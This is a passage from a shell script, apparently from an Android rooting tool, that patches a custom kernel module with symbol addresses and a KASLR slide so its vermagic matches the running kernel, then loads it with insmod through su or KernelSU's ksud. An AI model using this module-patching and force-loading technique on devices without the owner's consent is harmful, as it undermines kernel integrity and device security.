        elif [ -n "$EM" ] && [ "$EM" != "b700" ]; then
            echo "CUSTOM_KO=failed reason=not_aarch64 arch=$EM"
        elif [ -n "$VM" ] && ! printf '%s' "$VM" | grep -q '6\.12'; then
            echo "CUSTOM_KO=failed reason=vermagic_mismatch expected=6.12 actual=$VM"
        elif [ -z "${SLIDE:-}" ] || [ -z "${SYMS:-}" ] || [ ! -f "$SYMS" ] || [ ! -x "$D/ko_patch" ]; then
            echo "CUSTOM_KO=failed reason=patch_inputs_missing slide=${SLIDE:-} syms=${SYMS:-}"
        else
            "$D/ko_patch" "$CUSTOM_KO" "$CUSTOM_PATCHED" "$SYMS" "$SLIDE" "$TARGET_KERNEL" >> "$CUSTOM_LOG" 2>&1
            PATCH_RC=$?
            PATCH_LINE=$(grep -m1 '^PATCHED=' "$CUSTOM_LOG" 2>/dev/null)
            CUSTOM_MISSING=$(printf '%s\n' "$PATCH_LINE" | sed -n 's/^PATCHED=[0-9]* MISSING=\([0-9][0-9]*\).*/\1/p')
            echo "CUSTOM_KO_PATCH=rc=$PATCH_RC missing=${CUSTOM_MISSING:-none} line=$PATCH_LINE" | tee -a "$CUSTOM_LOG"
            if [ "$PATCH_RC" != "0" ] || [ "${CUSTOM_MISSING:-1}" != "0" ] || [ ! -f "$CUSTOM_PATCHED" ]; then
                echo "CUSTOM_KO=failed reason=ko_patch log=$CUSTOM_LOG"
            elif ! printf '%s\n' "$PATCH_LINE" | grep -Fq "VERMAGIC=$TARGET_KERNEL SMP"; then
                echo "CUSTOM_KO=failed reason=vermagic_target_mismatch expected=$TARGET_KERNEL line=$PATCH_LINE"
            else
                echo "CUSTOM_KO_VERMAGIC_MATCH=ok target=$TARGET_KERNEL" | tee -a "$CUSTOM_LOG"
                SU_BIN=$(command -v su 2>/dev/null || true)
                if [ -z "$SU_BIN" ]; then
                    ln -sf "${KSUD:-/data/adb/ksud}" "$D/su" 2>/dev/null || true
                    SU_BIN=$D/su
                fi
                printf 'insmod "%s" >/dev/null 2>&1; echo CUSTOM_KO_RC=$?\n' "$CUSTOM_PATCHED" \
                    | "$SU_BIN" > "$CUSTOM_LOG" 2>&1
                if grep -q 'CUSTOM_KO_RC=0' "$CUSTOM_LOG" 2>/dev/null; then
                    echo "CUSTOM_KO=loaded path=$CUSTOM_PATCHED source=$CUSTOM_KO"
                else
                    echo "CUSTOM_KO=failed reason=insmod log=$CUSTOM_LOG"
                fi
            fi
        fi
    else
        echo "CUSTOM_KO=missing path=$CUSTOM_KO"
    fi
fi

grep -i kernelsu /proc/modules 2>/dev/null
:
echo "DONE"

if [ "$AB_EXPORT" = "1" ]; then
    AB_DIR=/sdcard/Download/MagicRoot-ab
    mkdir -p "$AB_DIR" 2>/dev/null || true
    cp -f "$D/run.log" "$AB_DIR/run-$(date +%s)-$$.log" 2>/dev/null || true
fi

exit 0

























